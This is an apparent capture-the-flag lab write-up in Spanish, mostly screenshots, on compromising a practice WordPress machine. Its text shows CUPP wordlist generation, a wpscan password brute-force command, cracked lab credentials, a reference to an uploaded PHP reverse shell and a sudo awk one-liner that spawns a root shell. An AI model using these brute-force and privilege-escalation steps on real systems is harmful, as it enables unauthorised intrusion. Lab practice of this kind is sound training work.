-- --
- Tags: #ejptmachine #wordpress #reverseshell #cupp 
---

![Pasted image 20250122222745](../../Fotos/Pasted%20image%2020250122222745.png)

![Pasted image 20250122222823](../../Fotos/Pasted%20image%2020250122222823.png)

![Pasted image 20250122222945](../../Fotos/Pasted%20image%2020250122222945.png)

![Pasted image 20250122223647](../../Fotos/Pasted%20image%2020250122223647.png)

![Pasted image 20250122223705](../../Fotos/Pasted%20image%2020250122223705.png)

![Pasted image 20250122224305](../../Fotos/Pasted%20image%2020250122224305.png)
- Usuario luisillo


`python3 cupp.py`
![Pasted image 20250122225046](../../Fotos/Pasted%20image%2020250122225046.png)
- Nos creo un diccionario con 2796 palabras 

`wpscan --url http://172.17.0.2/wordpress --usernames luisillo --passwords /opt/cupp/cupp/luis.txt`
![Pasted image 20250122225327](../../Fotos/Pasted%20image%2020250122225327.png)
![Pasted image 20250122225320](../../Fotos/Pasted%20image%2020250122225320.png)
- luisillo / Luis1981 
![Pasted image 20250122225539](../../Fotos/Pasted%20image%2020250122225539.png)
- Esto sucede al entrar a wordpress/wp-admin/ 
- Lo agregaremos al etc/hosts 

wordpress/wp-admin/  Tarda en ingresar pero con paciencia 
![Pasted image 20250122230126](../../Fotos/Pasted%20image%2020250122230126.png)

![Pasted image 20250122230219](../../Fotos/Pasted%20image%2020250122230219.png)

Reverse shell php
![Pasted image 20250122231105](../../Fotos/Pasted%20image%2020250122231105.png)

![Pasted image 20250122231132](../../Fotos/Pasted%20image%2020250122231132.png)

http://172.17.0.2/wordpress/wp-content/uploads/
![Pasted image 20250122231204](../../Fotos/Pasted%20image%2020250122231204.png)

![Pasted image 20250122231442](../../Fotos/Pasted%20image%2020250122231442.png)

![Pasted image 20250122231641](../../Fotos/Pasted%20image%2020250122231641.png)
- luisillopasswordsecret

![Pasted image 20250122231732](../../Fotos/Pasted%20image%2020250122231732.png)

![Pasted image 20250122231807](../../Fotos/Pasted%20image%2020250122231807.png)

`sudo awk 'BEGIN {system("/bin/sh")}'`
![Pasted image 20250122231850](../../Fotos/Pasted%20image%2020250122231850.png)


